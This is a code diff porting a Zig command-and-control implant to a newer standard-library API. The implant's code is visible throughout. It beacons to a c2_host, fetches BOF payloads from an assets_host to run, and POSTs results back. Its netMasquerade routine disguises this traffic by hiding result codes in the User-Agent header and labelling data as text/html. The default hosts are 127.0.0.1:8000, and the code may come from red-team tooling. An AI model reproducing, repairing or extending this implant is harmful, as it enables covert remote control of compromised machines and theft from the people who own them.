@@ -108,7 +108,7 @@ fn netHttpConnect(s: *State, connectionType: netConnectionType, extra_data: ?*an
     var address: []const u8 = undefined;
     var host: []const u8 = undefined;
     var port: u16 = undefined;
-    const proto: std.http.Client.Connection.Protocol = .plain;
+    const proto: std.http.Client.Protocol = .plain;
 
     _ = extra_data;
 
@@ -174,16 +174,16 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
 
     const http_reqOptions = s.allocator.create(std.http.Client.RequestOptions) catch return null;
     http_reqOptions.* = .{
-        .server_header_buffer = server_header_buffer,
+        //.server_header_buffer = server_header_buffer,
         .keep_alive = true,
     };
     defer s.allocator.destroy(http_reqOptions);
 
     if (connectionType == netConnectionType.Heartbeat) {
         http_method = std.http.Method.GET;
-        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
+        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
         //defer s.allocator.free(url);
-        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+        uri = std.Uri.parse(url) catch return null;
 
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
@@ -194,9 +194,9 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
         std.log.info("in netExchange: ResurceFetch {s}", .{bof_path});
 
         http_method = std.http.Method.GET;
-        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path }) catch unreachable;
+        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path }) catch unreachable;
         //defer s.allocator.free(url);
-        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+        uri = std.Uri.parse(url) catch return null;
 
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
@@ -206,9 +206,9 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
         bof_res = @as(*BofRes, @ptrCast(@alignCast(extra_data)));
 
         http_method = std.http.Method.POST;
-        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
+        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
         //defer s.allocator.free(url);
-        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+        uri = std.Uri.parse(url) catch return null;
 
         // apply HTTP header transforms and
         // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
@@ -220,7 +220,7 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
     }
 
     // create HTTP request
-    var server_header: std.heap.FixedBufferAllocator = .init(server_header_buffer);
+    //var server_header: std.heap.FixedBufferAllocator = .init(server_header_buffer);
     const http_request = s.allocator.create(std.http.Client.Request) catch return null;
     http_request.* = .{
         .uri = uri,
@@ -232,13 +232,13 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
         .transfer_encoding = .none,
         .redirect_behavior = http_reqOptions.redirect_behavior,
         .handle_continue = http_reqOptions.handle_continue,
-        .response = .{
-            .version = undefined,
-            .status = undefined,
-            .reason = undefined,
-            .keep_alive = undefined,
-            .parser = .init(server_header.buffer[server_header.end_index..]),
-        },
+        //.response = .{
+        //    .version = undefined,
+        //    .status = undefined,
+        //    .reason = undefined,
+        //    .keep_alive = undefined,
+        //    .parser = .init(server_header.buffer[server_header.end_index..]),
+        //},
         .headers = http_reqOptions.headers,
         .extra_headers = http_reqOptions.extra_headers,
         .privileged_headers = http_reqOptions.privileged_headers,
@@ -323,7 +323,9 @@ fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptio
         };
 
         // header transforms: string(result:{d}) -> HTTP user_agent header
-        http_reqOptions.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = try std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.?.status_code}) };
+        http_reqOptions.headers.user_agent = std.http.Client.Request.Headers.Value{
+            .override = try std.fmt.allocPrint(s.allocator, "result:{d}", .{bof_res.?.status_code}),
+        };
 
         // header transforms: content_type -> "text/html"
         http_reqOptions.headers.content_type = std.http.Client.Request.Headers.Value{
@@ -393,9 +395,9 @@ pub const State = struct {
 
     jitter: u32,
 
-    c2_host: [:0]const u8,
-    c2_endpoint: [:0]const u8,
-    assets_host: [:0]const u8,
+    c2_host: []const u8,
+    c2_endpoint: []const u8,
+    assets_host: []const u8,
 
     pending_bofs: std.array_list.Managed(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
@@ -447,9 +449,9 @@ pub const State = struct {
 
             .jitter = 3,
 
-            .c2_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),
-            .c2_endpoint = try std.fmt.allocPrintZ(allocator, "/endpoint", .{}),
-            .assets_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),
+            .c2_host = "127.0.0.1:8000",
+            .c2_endpoint = "/endpoint",
+            .assets_host = "127.0.0.1:8000",
 
             .base64_decoder = base64_decoder,
             .base64_encoder = base64_encoder,
@@ -461,10 +463,6 @@ pub const State = struct {
 
     fn deinit(state: *State, allocator: std.mem.Allocator) void {
         allocator.free(state.implant_identity);
-
-        allocator.free(state.c2_host);
-        allocator.free(state.c2_endpoint);
-        allocator.free(state.assets_host);
 
         state.pending_bofs.deinit();
         state.persistent_bofs.deinit();
@@ -887,6 +885,6 @@ pub export fn go(_: ?[*]u8, _: i32) callconv(.c) u8 {
         // process queued BOFs
         processPendingBofs(allocator, &state) catch {};
 
-        std.time.sleep(state.jitter * @as(u64, 1e9));
+        std.Thread.sleep(state.jitter * @as(u64, 1e9));
     }
 }
